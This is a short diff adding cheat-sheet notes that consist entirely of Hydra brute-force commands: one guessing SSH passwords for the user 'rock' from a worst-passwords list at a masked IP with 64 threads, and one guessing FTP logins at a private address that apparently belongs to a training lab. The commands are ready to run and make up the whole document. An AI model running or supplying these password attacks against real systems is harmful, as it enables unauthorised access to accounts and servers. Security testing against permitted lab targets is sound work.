@@ -1,1 +1,5 @@
+SSH
 hydra -l rock -P 500-worst-passwords.txt ssh://xxx.xxx.xxx.xxx -V -t 64
+
+FTP
+hydra -l user -P passlist.txt ftp://10.10.212.159
